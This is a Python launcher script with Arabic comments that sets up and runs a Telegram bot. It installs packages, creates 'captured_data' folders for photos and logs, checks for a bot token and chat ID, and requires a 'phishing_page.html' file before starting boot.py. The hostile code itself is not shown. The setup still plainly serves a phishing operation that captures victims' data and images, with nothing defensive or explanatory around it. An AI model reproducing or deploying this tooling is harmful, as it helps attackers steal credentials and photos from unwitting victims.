#!/usr/bin/env python3
# ملف تشغيل البوت على السيرفر

import subprocess
import sys
import os
from pathlib import Path

def install_requirements():
    """تثبيت المتطلبات"""
    print("🔧 تثبيت المتطلبات...")
    
    requirements = [
        "python-telegram-bot",
        "aiohttp",
        "aiofiles", 
        "Pillow"
    ]
    
    for req in requirements:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", req])
            print(f"✅ تم تثبيت {req}")
        except subprocess.CalledProcessError:
            print(f"❌ فشل تثبيت {req}")
            return False
    
    return True

def create_directories():
    """إنشاء المجلدات المطلوبة"""
    print("📁 إنشاء المجلدات...")
    
    dirs = [
        "captured_data",
        "captured_data/photos", 
        "captured_data/logs"
    ]
    
    for dir_path in dirs:
        Path(dir_path).mkdir(parents=True, exist_ok=True)
        print(f"✅ تم إنشاء {dir_path}")

def check_config():
    """التحقق من الإعدادات"""
    print("🔍 التحقق من الإعدادات...")
    
    # قراءة ملف boot.py
    with open("boot.py", "r", encoding="utf-8") as f:
        content = f.read()
    
    if "YOUR_BOT_TOKEN_HERE" in content:
        print("❌ يرجى تحديث TOKEN في boot.py")
        return False
    
    if "YOUR_CHAT_ID" in content:
        print("❌ يرجى تحديث CHAT_ID في boot.py")
        return False
    
    print("✅ الإعدادات صحيحة")
    return True

def start_bot():
    """تشغيل البوت"""
    print("🚀 تشغيل البوت...")
    
    try:
        # تشغيل البوت
        subprocess.run([sys.executable, "boot.py"])
    except KeyboardInterrupt:
        print("\n⏹️ تم إيقاف البوت")
    except Exception as e:
        print(f"❌ خطأ في تشغيل البوت: {e}")

def main():
    """الدالة الرئيسية"""
    print("=" * 50)
    print("🤖 مُشغل بوت تيليجرام")
    print("=" * 50)
    
    # التحقق من وجود الملفات المطلوبة
    required_files = ["boot.py", "index.html", "phishing_page.html"]
    
    for file_name in required_files:
        if not os.path.exists(file_name):
            print(f"❌ الملف المطلوب غير موجود: {file_name}")
            return
    
    print("✅ جميع الملفات موجودة")
    
    # تثبيت المتطلبات
    if not install_requirements():
        print("❌ فشل في تثبيت المتطلبات")
        return
    
    # إنشاء المجلدات
    create_directories()
    
    # التحقق من الإعدادات
    if not check_config():
        print("❌ يرجى تصحيح الإعدادات أولاً")
        return
    
    # تشغيل البوت
    start_bot()

if __name__ == "__main__":
    main()
